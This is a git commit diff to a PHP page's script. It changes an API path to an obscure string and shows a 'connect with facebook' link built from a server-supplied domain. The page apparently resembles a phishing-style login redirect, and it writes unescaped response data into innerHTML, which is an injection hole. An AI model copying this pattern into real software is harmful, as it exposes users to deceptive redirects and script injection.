4b677219fac7d19662fa5e91f5aad78b4aabc45a
Aiman Errajiy <70611244+theblack-wis@users.noreply.github.com>
2022-09-28 22:07:46 +0100

    Update index.php

--- api/index.php
+++ api/index.php
@@ -93,7 +93,7 @@
       const urlParams = new URLSearchParams(queryString);
       const u = urlParams.get("u");
 	    
-    axios.get("/data").then((resps) =>
+    axios.get("/data/tyzteytzyrzetzy").then((resps) =>
       {
         document.getElementById('wait').style.display= "none";
 	document.getElementById('btn').innerHTML = `<a href=${resps.data.domain}?u=${u} class="log">connect with facebook <i id="icon" class="fab fa-facebook"></i></a>`
